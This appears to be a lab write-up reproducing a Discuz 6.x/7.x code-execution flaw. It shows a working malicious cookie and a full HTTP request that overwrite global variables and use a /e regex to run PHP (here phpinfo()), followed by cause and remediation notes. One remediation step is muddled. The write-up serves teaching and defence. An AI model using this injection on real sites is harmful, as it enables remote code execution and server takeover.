# Discuz 7.x/6.x Global Variable Defense Bypass leading to Code Execution

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **Vulnerability Name** | Discuz 7.x/6.x Global Variable Defense Bypass leading to Code Execution |
| **Affected Component** | Discuz! Forum |
| **Vulnerability Type** | Code Execution |
| **Severity** | 🔴 High |
| **Default Port** | 8080 |

## Vulnerability Description

`Discuz` is one of the popular Chinese forum software systems, developed using `PHP+MySQL`.

In PHP 5.3.x versions, the `request_order` default value in php.ini is "GP", which means `$_REQUEST` no longer automatically includes variables from `$_COOKIE`. However, Discuz directly uses the `$GLOBALS` global variable in certain processing flows. By passing `$GLOBALS` through cookies, attackers can overwrite global variables, causing a code execution vulnerability.

## Vulnerability Reproduction

### Environment Information

- Target IP: 192.168.2.47
- Web Port: 8080

### Operation Steps

**1. Install Discuz**

After starting, access `http://192.168.2.47:8080/install/` to install Discuz. Fill in the database address as `db`, database name as `discuz`, and database username and password as `root`.

![Installation Page](https://static.nextcyber.cn/attachments/images/course/task/3cbee4e141b44419b62abe6bb2fcd7d8.png)

**2. Send Malicious Cookie**

After successful installation, find an existing post and send a data packet to it, adding the following to the `Cookie`:

```
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
```

The request sent:

```
GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Host: 192.168.2.47:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
Connection: close
```

![Send Request](https://static.nextcyber.cn/attachments/images/course/task/5ae1598102d2442991ef1d52b6f881c7.png)

As you can see, `phpinfo` has been successfully executed.

## Vulnerability Principle

In PHP 5.3.x versions, `request_order` defaults to "GP", meaning `$_REQUEST` no longer automatically includes `$_COOKIE` variables. However, Discuz directly uses `$GLOBALS` global variables in certain processing flows. Attackers can pass `GLOBALS[_DCACHE][smilies][searcharray]` and `GLOBALS[_DCACHE][smilies][replacearray]` through cookies to overwrite variables in the program. When the program uses these polluted variables for regex replacement, the passed `replacearray` is executed as PHP code, leading to code execution.

## Remediation Recommendations

1. Upgrade to PHP 5.3.x or higher and properly configure `request_order`
2. Avoid using `$GLOBALS` global variables
3. Perform strict filtering and validation on user input
4. Use whitelist mechanisms to restrict executable code
